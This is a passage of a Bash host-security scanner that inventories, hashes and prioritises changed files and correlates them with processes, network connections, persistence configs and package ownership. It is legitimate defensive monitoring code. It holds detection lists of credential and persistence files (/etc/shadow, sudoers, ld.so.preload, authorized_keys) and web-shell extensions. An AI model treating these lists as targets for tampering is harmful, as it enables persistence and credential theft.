    [ -n "$FILE_SCAN_CONFIG_FILE" ] || FILE_SCAN_CONFIG_FILE="${config_dir}/file-scan.config"
    [ -r "$FILE_SCAN_CONFIG_FILE" ] || [ ! -r "${PROGRAM_DIR}/file-scan.config" ] || FILE_SCAN_CONFIG_FILE="${PROGRAM_DIR}/file-scan.config"
    [ -r "$FILE_SCAN_CONFIG_FILE" ] || return 0
    FILE_SCAN_CONFIG_STATUS=LOADED
    while IFS='=' read -r key value; do
        key=$(printf '%s' "$key" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        value=$(printf '%s' "$value" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        [[ -z "$key" || "$key" == \#* ]] && continue
        case "$key" in
            MaxFiles) if [[ "$value" =~ ^[0-9]+$ ]] && [ "$value" -ge 1 ] && [ "$value" -le 50000 ]; then FILE_MAX_FILES="$value"; else file_scan_config_warning "$key" "$value"; fi ;;
            MaxDepth) if [[ "$value" =~ ^[0-9]+$ ]] && [ "$value" -le 20 ]; then FILE_MAX_DEPTH="$value"; else file_scan_config_warning "$key" "$value"; fi ;;
            MaxHashMB) if [[ "$value" =~ ^[0-9]+$ ]] && [ "$value" -ge 1 ] && [ "$value" -le 2048 ]; then FILE_MAX_HASH_BYTES=$((value * 1024 * 1024)); else file_scan_config_warning "$key" "$value"; fi ;;
            TimeoutSeconds) if [[ "$value" =~ ^[0-9]+$ ]] && [ "$value" -ge 10 ] && [ "$value" -le 3600 ]; then FILE_TIMEOUT_SECONDS="$value"; else file_scan_config_warning "$key" "$value"; fi ;;
            RecentDays) if [[ "$value" =~ ^[0-9]+$ ]] && [ "$value" -le 365 ]; then FILE_RECENT_DAYS="$value"; else file_scan_config_warning "$key" "$value"; fi ;;
            SmallFilePriorityKB) if [[ "$value" =~ ^[0-9]+$ ]] && [ "$value" -ge 1 ] && [ "$value" -le 10240 ]; then FILE_SMALL_PRIORITY_BYTES=$((value * 1024)); else file_scan_config_warning "$key" "$value"; fi ;;
            PriorityAddedSmall|PriorityModified|PriorityRuntimeExe|PriorityRuntimeMapped|PriorityWebRoot|PriorityTmpExecutable|PriorityPersistencePath|PriorityRecent|PrioritySuspiciousExtension)
                if [[ "$value" =~ ^[0-9]+$ ]] && [ "$value" -le 10000 ]; then
                    case "$key" in
                        PriorityAddedSmall) FILE_PRIORITY_ADDED_SMALL="$value" ;;
                        PriorityModified) FILE_PRIORITY_MODIFIED="$value" ;;
                        PriorityRuntimeExe) FILE_PRIORITY_RUNTIME_EXE="$value" ;;
                        PriorityRuntimeMapped) FILE_PRIORITY_RUNTIME_MAPPED="$value" ;;
                        PriorityWebRoot) FILE_PRIORITY_WEB_ROOT="$value" ;;
                        PriorityTmpExecutable) FILE_PRIORITY_TMP_EXECUTABLE="$value" ;;
                        PriorityPersistencePath) FILE_PRIORITY_PERSISTENCE_PATH="$value" ;;
                        PriorityRecent) FILE_PRIORITY_RECENT="$value" ;;
                        PrioritySuspiciousExtension) FILE_PRIORITY_SUSPICIOUS_EXTENSION="$value" ;;
                    esac
                else file_scan_config_warning "$key" "$value"; fi
                ;;
            ScanRoots) FILE_SCAN_ROOTS="$value" ;;
            Extensions) FILE_EXTENSIONS="${value#.}"; FILE_EXTENSIONS="${FILE_EXTENSIONS//,./,}" ;;
            ExcludeDirectories) FILE_EXCLUDE_NAMES="$value" ;;
            ApprovedHashes) FILE_APPROVED_HASHES=$(printf '%s' "$value" | tr ';' ',') ;;
            MaliciousHashes) FILE_MALICIOUS_HASHES=$(printf '%s' "$value" | tr ';' ',') ;;
        esac
    done < "$FILE_SCAN_CONFIG_FILE"
}

file_candidate_priority() {
    local path="$1" dev="$2" inode="$3" size="$4" mtime="$5" ctime="$6" score=0 reasons="" old old_dev old_inode old_size old_mtime old_md5 old_sha old_ctime ext now_epoch
    if [ -z "${previous_line[$path]:-}" ]; then
        if [ "$size" -lt "$FILE_SMALL_PRIORITY_BYTES" ]; then score=$((score + FILE_PRIORITY_ADDED_SMALL)); reasons="ADDED_SMALL"; fi
    else
        old="${previous_line[$path]}"; IFS=$'\t' read -r old_dev old_inode old_size old_mtime old_md5 old_sha old_ctime <<< "$old"
        if [ "$dev:$inode:$size:$mtime:$ctime" != "$old_dev:$old_inode:$old_size:$old_mtime:$old_ctime" ]; then score=$((score + FILE_PRIORITY_MODIFIED)); reasons="MODIFIED"; fi
    fi
    if [ -n "${runtime_exe_candidates[$path]:-}" ]; then score=$((score + FILE_PRIORITY_RUNTIME_EXE)); reasons="${reasons}${reasons:+,}RUNTIME_EXE"; fi
    if [ -n "${runtime_mapped_candidates[$path]:-}" ]; then score=$((score + FILE_PRIORITY_RUNTIME_MAPPED)); reasons="${reasons}${reasons:+,}RUNTIME_MAPPED"; fi
    case "$path" in /var/www/*|/srv/www/*|/usr/share/nginx/*|/usr/local/nginx/*|/opt/www/*|*/public_html/*|*/www/*) score=$((score + FILE_PRIORITY_WEB_ROOT)); reasons="${reasons}${reasons:+,}WEB_ROOT" ;; esac
    if [[ "$path" == /tmp/* || "$path" == /var/tmp/* || "$path" == /dev/shm/* ]] && [ -x "$path" ]; then score=$((score + FILE_PRIORITY_TMP_EXECUTABLE)); reasons="${reasons}${reasons:+,}TMP_EXECUTABLE"; fi
    if critical_persistence_path "$path"; then score=$((score + FILE_PRIORITY_PERSISTENCE_PATH)); reasons="${reasons}${reasons:+,}PERSISTENCE_PATH"; fi
    now_epoch="${candidate_now_epoch:-$(date +%s)}"
    if [[ "$mtime" =~ ^[0-9]+$ ]] && [ "$mtime" -ge $((now_epoch - FILE_RECENT_DAYS * 86400)) ]; then score=$((score + FILE_PRIORITY_RECENT)); reasons="${reasons}${reasons:+,}RECENT"; fi
    ext=$(printf '%s' "${path##*.}" | tr '[:upper:]' '[:lower:]')
    case "$ext" in php|php3|php4|php5|phtml|phar|jsp|jspx|asp|aspx|ashx|cgi|pl|so|ko|elf|bin|run) score=$((score + FILE_PRIORITY_SUSPICIOUS_EXTENSION)); reasons="${reasons}${reasons:+,}SUSPICIOUS_EXTENSION" ;; esac
    [ -n "$reasons" ] || reasons=DEFAULT
    printf '%s\t%s' "$score" "$reasons"
}

add_scored_file_candidate() {
    local path="$1" meta dev inode size mtime ctime priority_data score reasons
    [[ "$path" != *$'\t'* && "$path" != *$'\n'* ]] || return 0
    [ -z "${candidate_seen[$path]:-}" ] || return 0
    candidate_seen["$path"]=1
    [ $((SECONDS - started)) -lt "$FILE_TIMEOUT_SECONDS" ] || { FILE_SCAN_STATUS=PARTIAL_TIMEOUT; return 2; }
    [ -f "$path" ] && [ ! -L "$path" ] || return 0
    file_is_excluded "$path" && return 0
    is_secscope_generated_path "$path" && return 0
    [[ "$path" == "${STATE_DIR}"/* ]] && return 0
    file_in_scan_roots "$path" || return 0
    file_is_candidate "$path" || return 0
    [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_STAT_CALLS=$((BENCHMARK_STAT_CALLS + 1))
    meta=$(stat -c '%d:%i:%s:%Y:%Z' -- "$path" 2>/dev/null || stat -f '%d:%i:%z:%m:%c' -- "$path" 2>/dev/null) || return 0
    IFS=':' read -r dev inode size mtime ctime <<< "$meta"
    [[ "$size" =~ ^[0-9]+$ ]] && [ "$size" -le "$FILE_MAX_HASH_BYTES" ] || return 0
    priority_data=$(file_candidate_priority "$path" "$dev" "$inode" "$size" "$mtime" "$ctime"); IFS=$'\t' read -r score reasons <<< "$priority_data"
    printf '%s\t%s\t%s\t%s\t%s\n' "$score" "$mtime" "$size" "$path" "$reasons" >> "$priority_file"
}

md5_file() {
    if command -v md5sum >/dev/null 2>&1; then md5sum -- "$1" | awk '{print $1}'
    elif command -v md5 >/dev/null 2>&1; then md5 -q -- "$1" 2>/dev/null
    else openssl dgst -md5 -- "$1" 2>/dev/null | awk '{print $NF}'; fi
}

file_hash_pair_safe() {
    local path="$1" before after size md5 sha
    [ -f "$path" ] || { printf 'DELETED\t\t\t文件已删除'; return; }
    [ ! -L "$path" ] || { printf 'SYMLINK_SKIPPED\t\t\t已跳过符号链接'; return; }
    [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_STAT_CALLS=$((BENCHMARK_STAT_CALLS + 1))
    before=$(stat -c '%d:%i:%s:%Y:%Z' -- "$path" 2>/dev/null || stat -f '%d:%i:%z:%m:%c' -- "$path" 2>/dev/null) || { printf 'UNREADABLE\t\t\t无法读取元数据'; return; }
    size=$(printf '%s' "$before" | awk -F: '{print $3}')
    [[ "$size" =~ ^[0-9]+$ ]] || { printf 'UNREADABLE\t\t\t文件大小无效'; return; }
    [ "$size" -le "$FILE_MAX_HASH_BYTES" ] || { printf 'TOO_LARGE\t\t\t超过哈希大小限制'; return; }
    md5=$(md5_file "$path" 2>/dev/null) || { printf 'UNREADABLE\t\t\tMD5 计算失败'; return; }
    sha=$(sha256_file "$path" 2>/dev/null) || { printf 'UNREADABLE\t\t\tSHA-256 计算失败'; return; }
    [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_STAT_CALLS=$((BENCHMARK_STAT_CALLS + 1))
    after=$(stat -c '%d:%i:%s:%Y:%Z' -- "$path" 2>/dev/null || stat -f '%d:%i:%z:%m:%c' -- "$path" 2>/dev/null) || { printf 'DELETED\t\t\t文件计算后消失'; return; }
    [ "$before" = "$after" ] || { printf 'CHANGED_DURING_HASH\t\t\t文件计算过程中发生变化'; return; }
    printf 'SUCCESS\t%s\t%s\t' "$md5" "$sha"
}

csv_has_value() {
    local csv=",$(printf '%s' "$1" | tr '[:upper:]' '[:lower:]' | tr -d '[:space:]')," value
    value=$(printf '%s' "$2" | tr '[:upper:]' '[:lower:]')
    [[ "$csv" == *",${value},"* ]]
}

file_is_excluded() {
    local path="$1" name
    for name in "${FILE_EXCLUDE_ARRAY[@]}"; do [ -n "$name" ] && [[ "/$path/" == *"/${name}/"* ]] && return 0; done
    return 1
}

file_is_candidate() {
    local path="$1" ext="${1##*.}"
    case "$path" in
        /etc/passwd|/etc/shadow|/etc/group|/etc/gshadow|/etc/sudoers|/etc/crontab|/etc/rc.local|/etc/ld.so.preload|/etc/ld.preload|\
        /root/.bashrc|/root/.bash_profile|/root/.profile|/root/.zshrc|*/.ssh/authorized_keys|*/.bashrc|*/.bash_profile|*/.profile|*/.zshrc) return 0 ;;
    esac
    [ -x "$path" ] && return 0
    [ -n "${FILE_EXTENSIONS_NORMALIZED:-}" ] || FILE_EXTENSIONS_NORMALIZED=$(printf '%s' ",${FILE_EXTENSIONS//[[:space:]]/}," | tr '[:upper:]' '[:lower:]')
    if [ "${BASH_VERSINFO[0]:-0}" -ge 4 ]; then ext="${ext,,}"; else ext=$(printf '%s' "$ext" | tr '[:upper:]' '[:lower:]'); fi
    [[ "$FILE_EXTENSIONS_NORMALIZED" == *",${ext},"* ]]
}

file_in_scan_roots() {
    local path="$1" root
    for root in "${FILE_SCAN_ROOT_ARRAY[@]}"; do
        [ -n "$root" ] || continue
        case "$path" in "$root"|"$root"/*) return 0 ;; esac
    done
    return 1
}

critical_persistence_path() {
    case "$1" in
        /etc/passwd|/etc/shadow|/etc/group|/etc/gshadow|/etc/sudoers|/etc/sudoers.d/*|/etc/crontab|/etc/cron.d/*|/var/spool/cron/*|\
        /etc/ld.so.preload|/etc/ld.preload|/etc/pam.d/*|/etc/systemd/system/*|/etc/rc.local|/etc/profile|/etc/profile.d/*|\
        /root/.bashrc|/root/.bash_profile|/root/.profile|/root/.zshrc|*/.ssh/authorized_keys|*/.bashrc|*/.bash_profile|*/.profile|*/.zshrc) return 0 ;;
    esac
    return 1
}

append_process_pid_index() {
    local key="$1" value="$2" current=""
    [ -n "$key" ] && [ -n "$value" ] || return 0
    current="${FILE_PROCESS_PID_INDEX[$key]:-}"
    case ",${current}," in *",${value},"*) return 0 ;; esac
    FILE_PROCESS_PID_INDEX["$key"]="${current}${current:+,}${value}"
}

build_file_context_indexes() {
    local candidate_file="$1" pattern_file="${OUTPUT_DIR}/.file-context-patterns.${RUN_ID}"
    local pid_dir pid path arg line display current count
    if [ "${BASH_VERSINFO[0]:-0}" -lt 4 ]; then return 0; fi
    declare -A candidate_paths=() relevant_pids=() socket_counts=()
    unset FILE_PROCESS_PID_INDEX FILE_PROCESS_DISPLAY_INDEX FILE_NETWORK_PID_INDEX
    declare -gA FILE_PROCESS_PID_INDEX=() FILE_PROCESS_DISPLAY_INDEX=() FILE_NETWORK_PID_INDEX=()
    FILE_CONTEXT_INDEX_READY=false
    FILE_PERSISTENCE_REFERENCE_CACHE="${OUTPUT_DIR}/.file-persistence-references.${RUN_ID}"
    : > "$pattern_file"; : > "$FILE_PERSISTENCE_REFERENCE_CACHE"

    while IFS=$'\t' read -r _ _ _ path _; do
        [ -n "$path" ] || continue
        candidate_paths["$path"]=1
        printf '%s\n' "$path" >> "$pattern_file"
    done < "$candidate_file"
    if [ -s "${FILE_INVENTORY_FILE:-}" ]; then
        while IFS=$'\t' read -r path _; do
            [[ -z "$path" || "$path" == \#* || -n "${candidate_paths[$path]:-}" ]] && continue
            candidate_paths["$path"]=1
            printf '%s\n' "$path" >> "$pattern_file"
        done < "$FILE_INVENTORY_FILE"
    fi

    # Build a reverse process index in one /proc pass. Executable paths are
    # indexed globally; absolute argv entries are limited to scan candidates.
    for pid_dir in /proc/[0-9]*; do
        [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_PROC_PID_VISITS=$((BENCHMARK_PROC_PID_VISITS + 1))
        pid="${pid_dir#/proc/}"
        path=$(readlink "$pid_dir/exe" 2>/dev/null || true); path="${path% (deleted)}"
        if [ -n "$path" ]; then
            append_process_pid_index "$path" "$pid"
            [ -z "${candidate_paths[$path]:-}" ] || relevant_pids["$pid"]=1
        fi
        [ -r "$pid_dir/cmdline" ] || continue
        while IFS= read -r -d '' arg; do
            local token
            local -a arg_tokens=()
            [ -n "$arg" ] || continue
            if [ -n "${candidate_paths[$arg]:-}" ]; then
                append_process_pid_index "$arg" "$pid"
                relevant_pids["$pid"]=1
                continue
            fi
            # Preserve the previous space-delimited shell -c matching while
            # avoiding a full candidate scan for every process.
            read -r -a arg_tokens <<< "$arg"
            for token in "${arg_tokens[@]}"; do
                token="${token#\"}"; token="${token%\"}"; token="${token#\'}"; token="${token%\'}"
                [ -n "$token" ] || continue
                [ -n "${candidate_paths[$token]:-}" ] || continue
                append_process_pid_index "$token" "$pid"
                relevant_pids["$pid"]=1
            done
        done < "$pid_dir/cmdline"
    done
    for pid in "${!relevant_pids[@]}"; do
        display=$(process_display_for_pid "$pid" 2>/dev/null || true)
        [ -z "$display" ] || FILE_PROCESS_DISPLAY_INDEX["$pid"]="$display"
    done

    # The socket snapshot is already captured once. Index at most five rows
    # per PID so later file lookups do not rescan it for every changed file.
    while IFS= read -r line; do
        pid=$(printf '%s\n' "$line" | sed -nE 's/.*pid=([0-9]+).*/\1/p' | head -1)
        [[ "$pid" =~ ^[0-9]+$ ]] || continue
        count="${socket_counts[$pid]:-0}"; [ "$count" -lt 5 ] || continue
        current="${FILE_NETWORK_PID_INDEX[$pid]:-}"
        FILE_NETWORK_PID_INDEX["$pid"]="${current}${current:+$'\n'}${line}"
        socket_counts["$pid"]=$((count + 1))
    done < <(socket_snapshot established)

    # GNU grep compiles all fixed candidate paths once and walks persistence
    # locations once. The compact hit cache preserves the previous literal
    # substring semantics without candidate_count x directory traversals.
    if [ -s "$pattern_file" ]; then
        LC_ALL=C grep -RHIhn -F -f "$pattern_file" -- \
            /etc/systemd/system /etc/cron.d /etc/crontab /var/spool/cron \
            > "$FILE_PERSISTENCE_REFERENCE_CACHE" 2>/dev/null || true
    fi
    rm -f "$pattern_file"
    FILE_CONTEXT_INDEX_READY=true
}

file_process_context() {
    local path="$1" link pid contexts="" cmdline display
    if [ "$FILE_CONTEXT_INDEX_READY" = true ]; then
        local indexed_pids="${FILE_PROCESS_PID_INDEX[$path]:-}"
        IFS=',' read -r -a indexed_pid_items <<< "$indexed_pids"
        for pid in "${indexed_pid_items[@]}"; do
            [ -n "$pid" ] || continue
            display="${FILE_PROCESS_DISPLAY_INDEX[$pid]:-}"
            [ -n "$display" ] || display=$(process_display_for_pid "$pid" 2>/dev/null || true)
            if [ -n "$display" ]; then
                contexts="${contexts}${contexts:+,}$(printf '%s' "$display" | awk -F '\t' '{printf "PID=%s|instance=%s|exe=%s|user=%s|cmdline=%s|ppid=%s|service=%s|package=%s",$2,$1,$3,$4,$5,$6,$7,$8}')"
            else
                contexts="${contexts}${contexts:+,}PID=${pid}"
            fi
        done
        printf '%s' "$contexts"
        return 0
    fi
    for link in /proc/[0-9]*/exe; do
        pid="${link#/proc/}"; pid="${pid%/exe}"
        if [ "$(readlink "$link" 2>/dev/null)" != "$path" ]; then
            cmdline=$(tr '\0' ' ' 2>/dev/null < "/proc/${pid}/cmdline" || true)
            [[ " $cmdline " == *" $path "* ]] || continue
        fi
        display=$(process_display_for_pid "$pid" 2>/dev/null)
        if [ -n "$display" ]; then
            contexts="${contexts}${contexts:+,}$(printf '%s' "$display" | awk -F '\t' '{printf "PID=%s|instance=%s|exe=%s|user=%s|cmdline=%s|ppid=%s|service=%s|package=%s",$2,$1,$3,$4,$5,$6,$7,$8}')"
        else
            contexts="${contexts}${contexts:+,}PID=${pid}"
        fi
    done
    printf '%s' "$contexts"
}

file_network_context() {
    local pids="$1" pid lines=""
    for pid in $(printf '%s' "$pids" | grep -oE 'PID=[0-9]+' | cut -d= -f2); do
        if [ "$FILE_CONTEXT_INDEX_READY" = true ]; then
            lines="${lines}${lines:+$'\n'}${FILE_NETWORK_PID_INDEX[$pid]:-}"
        else
            lines="${lines}${lines:+$'\n'}$(socket_snapshot established | grep -E "pid=${pid}," | head -5)"
        fi
    done
    printf '%s' "$lines"
}

file_persistence_context() {
    local path="$1"
    if [ "$FILE_CONTEXT_INDEX_READY" = true ] && [ -r "$FILE_PERSISTENCE_REFERENCE_CACHE" ]; then
        grep -F -m 5 -- "$path" "$FILE_PERSISTENCE_REFERENCE_CACHE" 2>/dev/null
    else
        grep -R -F -m 1 -- "$path" /etc/systemd/system /etc/cron.d /etc/crontab /var/spool/cron 2>/dev/null | head -5
    fi
}

prepare_package_owner_index() {
    [ "$PACKAGE_OWNER_INDEX_READY" = false ] || return 0
    PACKAGE_OWNER_INDEX_READY=UNAVAILABLE
    [ "$PKG_MGR" = dpkg ] || return 0
    local list package package_path loaded=false
    for list in /var/lib/dpkg/info/*.list; do
        [ -r "$list" ] || continue
        package="${list##*/}"; package="${package%.list}"
        while IFS= read -r package_path || [ -n "$package_path" ]; do
            [[ "$package_path" == /* ]] || continue
            if [ -z "${PACKAGE_OWNER_INDEX[$package_path]+present}" ]; then
                PACKAGE_OWNER_INDEX["$package_path"]="${package}: ${package_path}"
            fi
            loaded=true
        done < "$list"
    done
    [ "$loaded" = true ] && PACKAGE_OWNER_INDEX_READY=AVAILABLE
}

file_package_owner() {
    local path="$1" cached="" owner=""
    [[ "$path" != *$'\t'* && "$path" != *$'\n'* ]] || return 0
    if [ -z "$PACKAGE_OWNER_CACHE_FILE" ]; then
        PACKAGE_OWNER_CACHE_FILE="${OUTPUT_DIR:-${TMPDIR:-/tmp}}/.package-owner-cache.${RUN_ID}"
    fi
    if [ "$PKG_MGR" = dpkg ]; then
        prepare_package_owner_index
        if [ "$PACKAGE_OWNER_INDEX_READY" = AVAILABLE ]; then
            owner="${PACKAGE_OWNER_INDEX[$path]:-__UNOWNED__}"
            [ "$owner" = __UNOWNED__ ] || printf '%s' "$owner"
            return 0
        fi
    fi
    if [ -r "$PACKAGE_OWNER_CACHE_FILE" ]; then
        cached=$(awk -F '\t' -v path="$path" '$1==path {sub(/^[^\t]*\t/,""); print; exit}' "$PACKAGE_OWNER_CACHE_FILE" 2>/dev/null)
        [ "$cached" != __UNOWNED__ ] || return 0
        [ -z "$cached" ] || { printf '%s' "$cached"; return 0; }
    fi
    case "$PKG_MGR" in
        dpkg) owner=$(dpkg-query -S -- "$path" 2>/dev/null | head -1) ;;
        rpm) owner=$(rpm -qf -- "$path" 2>/dev/null | head -1) ;;
    esac
    if [ -n "${OUTPUT_DIR:-}" ] && { [ -d "$OUTPUT_DIR" ] || mkdir -p "$OUTPUT_DIR" 2>/dev/null; }; then
        printf '%s\t%s\n' "$path" "${owner:-__UNOWNED__}" >> "$PACKAGE_OWNER_CACHE_FILE" 2>/dev/null || true
        chmod 600 "$PACKAGE_OWNER_CACHE_FILE" 2>/dev/null || true
    fi
    printf '%s' "$owner"
}

add_file_behavior() {
    local action="$1" path="$2" md5="$3" sha="$4" sev="$5" confidence="$6" reason="$7" context="$8" size="${9:-0}" priority="${10:-NORMAL}" priority_score="${11:-0}" priority_reasons="${12:-DEFAULT}"
    FILE_BEHAVIOR_ACTIONS+=("$action"); FILE_BEHAVIOR_PATHS+=("$path"); FILE_BEHAVIOR_MD5+=("$md5"); FILE_BEHAVIOR_SHA256+=("$sha")
    FILE_BEHAVIOR_SEVS+=("$sev"); FILE_BEHAVIOR_CONFIDENCES+=("$confidence"); FILE_BEHAVIOR_REASONS+=("$reason"); FILE_BEHAVIOR_CONTEXTS+=("$context")
    FILE_BEHAVIOR_SIZES+=("$size"); FILE_BEHAVIOR_PRIORITIES+=("$priority")
    FILE_BEHAVIOR_PRIORITY_SCORES+=("$priority_score"); FILE_BEHAVIOR_PRIORITY_REASONS+=("$priority_reasons")
    [ "$sev" = "OBSERVE" ] && FILE_SCAN_OBSERVE=$((FILE_SCAN_OBSERVE + 1)) || FILE_SCAN_SUSPICIOUS=$((FILE_SCAN_SUSPICIOUS + 1))
}

assess_file_change() {
    local action="$1" path="$2" md5="$3" sha="$4" size="${5:-0}" moved_from="${6:-}" priority_score="${7:-0}" priority_reasons="${8:-DEFAULT}" process_context network_context persistence_context package_owner
    local sev="OBSERVE" confidence="LOW" reason="仅检测到文件清单变化，尚无危险行为关联" finding_type="SECURITY_ANOMALY" file_rule="FS-FILE-CHANGE" domains="FILE" counter
    local priority="NORMAL"
    if csv_has_value "$FILE_APPROVED_HASHES" "$md5" || csv_has_value "$FILE_APPROVED_HASHES" "$sha"; then return 0; fi
    process_context=$(file_process_context "$path")
    network_context=$(file_network_context "$process_context")
    persistence_context=$(file_persistence_context "$path")
    package_owner=$(file_package_owner "$path")
    if csv_has_value "$FILE_MALICIOUS_HASHES" "$md5" || csv_has_value "$FILE_MALICIOUS_HASHES" "$sha"; then
        sev="CRITICAL"; confidence="HIGH"; reason="命中组织确认恶意哈希"; finding_type="SECURITY_THREAT"; file_rule="FS-MALICIOUS-HASH"; domains="FILE,INTEGRITY"
    elif [ -n "$network_context" ]; then
        sev="HIGH"; confidence="HIGH"; reason="变化文件正被进程执行并存在网络连接"
        finding_type="SECURITY_THREAT"; domains="FILE,PROCESS,NETWORK"
    elif [ -n "$process_context" ] && [[ "$path" == /tmp/* || "$path" == /var/tmp/* || "$path" == /dev/shm/* ]]; then
        sev="HIGH"; confidence="MEDIUM"; reason="临时目录变化文件正在执行，但未发现当前网络关联"; domains="FILE,PROCESS"
    elif critical_persistence_path "$path"; then
        sev="MEDIUM"; confidence="MEDIUM"; reason="认证、提权或持久化关键文件发生变化"; domains="FILE,PERSISTENCE"
    elif [ -n "$process_context" ] || [ -n "$persistence_context" ]; then
        sev="MEDIUM"; confidence="MEDIUM"; reason="变化文件关联当前进程或持久化配置"; domains="FILE"; [ -z "$process_context" ] || domains="${domains},PROCESS"; [ -z "$persistence_context" ] || domains="${domains},PERSISTENCE"
    elif [ "$action" = "MODIFIED" ] && [[ "$path" == /etc/* || "$path" == /usr/local/bin/* || "$path" == /usr/local/sbin/* ]]; then
        sev="LOW"; confidence="MEDIUM"; reason="敏感配置或本地程序路径内容发生变化"
    fi
    if [ "$action" = "ADDED" ] && [[ "$size" =~ ^[0-9]+$ ]] && [ "$size" -lt "$FILE_SMALL_PRIORITY_BYTES" ]; then
        priority="SMALL_ADDED"
        reason="新增小文件优先监测（< $((FILE_SMALL_PRIORITY_BYTES / 1024)) KB）；${reason}"
        FILE_SCAN_ADDED_SMALL=$((FILE_SCAN_ADDED_SMALL + 1))
    fi
    reason="优先分=${priority_score}（${priority_reasons}）；${reason}"
    [ -n "$package_owner" ] && reason="${reason}；包归属=${package_owner}"
    [ -z "$moved_from" ] || reason="从 ${moved_from} 移动；${reason}"
    local context="process=${process_context:-none}; network=${network_context:-none}; persistence=${persistence_context:-none}; package=${package_owner:-unowned}; moved_from=${moved_from:-none}"
    counter="包归属=${package_owner:-unowned}；维护窗口=${MAINTENANCE_ACTIVE}；批准哈希未命中"
    add_file_behavior "$action" "$path" "$md5" "$sha" "$sev" "$confidence" "$reason" "$context" "$size" "$priority" "$priority_score" "$priority_reasons"
    record_find "$sev" filesystem "文件行为 ${action}: ${path}" "size=${size}; priority=${priority}; priority_score=${priority_score}; priority_reasons=${priority_reasons}; MD5=${md5:-N/A}; SHA256=${sha:-N/A}; ${context}; 原因=${reason}" \
        '核查来源、变更窗口、包归属、进程树和网络目的；确认恶意后再隔离' 'T1105' "$file_rule" "$path" \
        'file-changes.tsv,suspicious-files.tsv,file-inventory-current.tsv' "$finding_type" "$confidence" "$reason" \
        '若出现恶意哈希、执行与外连、持久化或多源终端防护命中，应提高风险等级' "$domains" "$counter" \
        "$RUN_STARTED_AT|FILE|${action} ${path};$RUN_STARTED_AT|PROCESS|${process_context:-none};$RUN_STARTED_AT|NETWORK|${network_context:-none};$RUN_STARTED_AT|PERSISTENCE|${persistence_context:-none}"
    [ "$finding_type" != "SECURITY_THREAT" ] || add_ioc Hash "$sha" "${action} ${path}"
}

monitor_file_candidate() {
    local path="$1" phase="$2" priority_score="${3:-0}" priority_reasons="${4:-DEFAULT}" now meta dev inode size mtime ctime status md5 sha message
    local action="" old="" old_dev="" old_inode="" old_size="" old_mtime="" old_md5="" old_sha="" old_ctime="" old_path="" priority="NORMAL"
    [[ "$path" != *$'\t'* && "$path" != *$'\n'* ]] || { FILE_SCAN_SKIPPED=$((FILE_SCAN_SKIPPED + 1)); return 0; }
    file_is_excluded "$path" && { FILE_SCAN_SKIPPED=$((FILE_SCAN_SKIPPED + 1)); return 0; }
    is_secscope_generated_path "$path" && return 0
    [[ "$path" == "${STATE_DIR}"/* ]] && return 0
    file_is_candidate "$path" || return 0
    [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_STAT_CALLS=$((BENCHMARK_STAT_CALLS + 1))
    meta=$(stat -c '%d:%i:%s:%Y:%Z' -- "$path" 2>/dev/null || stat -f '%d:%i:%z:%m:%c' -- "$path" 2>/dev/null) || { FILE_SCAN_SKIPPED=$((FILE_SCAN_SKIPPED + 1)); return 0; }
    IFS=':' read -r dev inode size mtime ctime <<< "$meta"
    [[ "$size" =~ ^[0-9]+$ ]] && [ "$size" -le "$FILE_MAX_HASH_BYTES" ] || { FILE_SCAN_SKIPPED=$((FILE_SCAN_SKIPPED + 1)); return 0; }

    [ "$phase" != "SCORED" ] || priority="SCORED"
    [ -z "${current_path[$path]:-}" ] || return 0
    now=$SECONDS
    [ $((now - started)) -lt "$FILE_TIMEOUT_SECONDS" ] || { FILE_SCAN_STATUS="PARTIAL_TIMEOUT"; return 2; }
    [ "$count" -lt "$FILE_MAX_FILES" ] || { FILE_SCAN_STATUS="PARTIAL_LIMIT"; return 2; }
    count=$((count + 1)); FILE_SCAN_SCANNED=$((FILE_SCAN_SCANNED + 1))
    [[ ",$priority_reasons," != *,ADDED_SMALL,* ]] || FILE_SCAN_SMALL_PRIORITY=$((FILE_SCAN_SMALL_PRIORITY + 1))
    current_path["$path"]=1; current_inode["${dev}:${inode}"]="$path"

    if [ -n "${previous_line[$path]:-}" ]; then
        old="${previous_line[$path]}"
        IFS=$'\t' read -r old_dev old_inode old_size old_mtime old_md5 old_sha old_ctime <<< "$old"
    fi
    if [ -n "$old_ctime" ] && [ "$old_dev" = "$dev" ] && [ "$old_inode" = "$inode" ] && \
       [ "$old_size" = "$size" ] && [ "$old_mtime" = "$mtime" ] && [ "$old_ctime" = "$ctime" ] && \
       [ -n "$old_md5" ] && [ -n "$old_sha" ]; then
        status="REUSED"; md5="$old_md5"; sha="$old_sha"
        FILE_SCAN_HASH_REUSED=$((FILE_SCAN_HASH_REUSED + 1))
    else
        [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_STAT_CALLS=$((BENCHMARK_STAT_CALLS + 2))
        IFS=$'\t' read -r status md5 sha message <<< "$(file_hash_pair_safe "$path")"
        if [ "$status" != "SUCCESS" ]; then
            FILE_SCAN_HASH_FAILED=$((FILE_SCAN_HASH_FAILED + 1)); FILE_SCAN_SKIPPED=$((FILE_SCAN_SKIPPED + 1))
            printf '%s\t%s\t%s\n' "$path" "$status" "$message" >> "${RAW_DIR}/file-hash-errors.tsv"
            return 0
        fi
        FILE_SCAN_HASH_SUCCESS=$((FILE_SCAN_HASH_SUCCESS + 1))
    fi
    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$path" "$dev" "$inode" "$size" "$mtime" "$md5" "$sha" "$ctime" >> "$FILE_INVENTORY_PENDING"
    [ -s "$FILE_INVENTORY_FILE" ] || return 0
    if [ -n "$old" ]; then
        [ "$old_sha" = "$sha" ] || action="MODIFIED"
    elif [ -n "${previous_inode_path[${dev}:${inode}]:-}" ]; then
        action="MOVED"; old_path="${previous_inode_path[${dev}:${inode}]}"
    else
        action="ADDED"
    fi
    [ -n "$action" ] || return 0
    [ "$action" != "ADDED" ] || [ "$size" -ge "$FILE_SMALL_PRIORITY_BYTES" ] || priority="SMALL_ADDED"
    FILE_SCAN_CHANGES=$((FILE_SCAN_CHANGES + 1))
